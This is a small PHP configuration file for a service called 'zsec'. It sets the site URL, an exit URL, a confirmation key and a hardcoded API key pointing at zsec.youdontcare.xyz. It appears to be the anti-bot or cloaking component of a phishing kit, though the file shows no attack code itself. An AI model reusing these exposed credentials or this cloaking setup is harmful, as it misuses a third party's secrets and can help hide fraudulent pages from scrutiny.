<?php

//config for zsec do not change anything
$add = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]"; //server checker DO NOT CAHNGE
$keyy = "NTU2Njg4NTU"; //zsec confirmation key
$api = "L3LuiQ8Jb9mLMAefX5QSuLlRNwFuVO1AoO0E8O2B"; //zsec api
$exiturl = $add; //server url
$zsec_site = "https://zsec.youdontcare.xyz/";

// on off zsec
$zsec_p = "off";

?>